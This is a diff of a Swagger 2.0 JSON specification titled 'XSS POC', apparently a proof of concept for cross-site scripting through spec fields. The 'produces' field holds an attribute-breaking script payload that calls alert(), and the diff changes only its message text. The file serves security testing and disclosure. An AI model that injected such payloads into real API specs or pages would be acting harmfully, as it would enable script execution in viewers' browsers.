@@ -1,7 +1,7 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "INVEST XSS POC",
+    "title": "XSS POC",
     "version": "v2"
   },
   "paths": {
@@ -10,7 +10,7 @@
         "operationId": "listVersionsv2",
         "summary": "List API versions",
         "produces": [
-          "\"><script>alert('XSS in INVESTs SWAGGERs')</script>"
+          "\"><script>alert('XSS in SWAGGERs')</script>"
         ],
         "responses": {
           "200": {
